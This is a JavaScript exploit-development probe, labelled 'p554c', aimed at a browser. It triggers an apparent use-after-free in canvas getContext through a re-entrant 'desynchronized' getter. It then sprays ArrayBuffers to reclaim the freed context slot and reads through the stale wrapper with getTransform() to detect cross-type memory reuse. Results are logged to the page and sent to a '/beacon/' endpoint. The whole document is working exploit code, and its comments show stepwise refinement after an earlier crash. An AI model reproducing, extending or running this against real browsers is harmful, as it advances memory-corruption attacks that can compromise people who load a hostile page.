// CRASH_CLASS: LOW
// PROBE p554c: Cross-type reclaim — NO pre-spray read
//
// p554b crashed reading freed memory before spray.
// getTransform() follows internal state stack pointer → freed → crash.
// Fix: spray FIRST, read AFTER.

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P554C-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 350));
    } catch (e) {}
  }

  function f64hex(f) {
    var buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    var u = new Uint8Array(buf);
    var s = '';
    for (var i = 7; i >= 0; i--) {
      var b = u[i].toString(16);
      s += (b.length < 2 ? '0' : '') + b;
    }
    return s;
  }

  emit('START', 'crosstype-safe');

  // ===================== Trigger UAF =====================
  var canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var g = 0;
  var opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get: function () { g++; if (g === 1) { inner = canvas.getContext('2d'); } return false; },
    enumerable: true
  });

  var outer = null;
  try { outer = canvas.getContext('2d', opts); } catch (e) { emit('ERR', String(e)); return; }
  retained.push(outer, inner);

  if (!inner || outer === inner) { emit('PATCHED', 'no UAF'); return; }
  emit('TRIGGER', 'uaf=true');

  // ===================== Spray IMMEDIATELY — no read before this =====================
  var SIZE = 768;
  var COUNT = 15;
  var abs = [];

  for (var i = 0; i < COUNT; i++) {
    var ab = new ArrayBuffer(SIZE);
    var dv = new Float64Array(ab);
    for (var j = 0; j < dv.length; j++) {
      dv[j] = 0xBEEF0000 + i + j * 0.0001;
    }
    abs.push(ab);
  }
  retained.push(abs);
  emit('SPRAYED', 'n=' + COUNT + ' size=' + SIZE);

  // ===================== NOW read through stale wrapper =====================
  var m = null;
  try {
    m = inner.getTransform();
  } catch (e) {
    emit('READ-ERR', String(e));
  }

  if (!m) {
    emit('READ-NULL', 'getTransform returned null');
    emit('ALIVE', 'done-null');
    window.__p554c = retained;
    return;
  }

  var isIdentity = Math.abs(m.a - 1) < 0.001 && Math.abs(m.b) < 0.001 &&
    Math.abs(m.c) < 0.001 && Math.abs(m.d - 1) < 0.001 &&
    Math.abs(m.e) < 0.001 && Math.abs(m.f) < 0.001;

  var isMarker = m.a > 0xBEEF0000 - 1;

  emit('POST', 'a=' + m.a + ' b=' + m.b + ' c=' + m.c +
    ' d=' + m.d + ' e=' + m.e + ' f=' + m.f);
  emit('POST-HEX', 'a=' + f64hex(m.a) + ' b=' + f64hex(m.b) +
    ' d=' + f64hex(m.d) + ' e=' + f64hex(m.e));
  emit('RESULT', 'identity=' + isIdentity + ' marker=' + isMarker);

  if (isMarker) {
    emit('HIT', 'CROSS-TYPE AT ' + SIZE + 'B');
  } else if (!isIdentity) {
    emit('WEIRD', 'non-standard — could be residual or partial');
  } else {
    emit('MISS', 'identity matrix — AB did not reclaim ctx slot at ' + SIZE + 'B');
  }

  // Read numeric props too
  try {
    emit('PROPS', 'lw=' + inner.lineWidth + ' ga=' + inner.globalAlpha +
      ' ml=' + inner.miterLimit + ' sb=' + inner.shadowBlur);
  } catch (e) {
    emit('PROPS-ERR', String(e));
  }

  emit('ALIVE', 'done');
  window.__p554c = retained;
})();
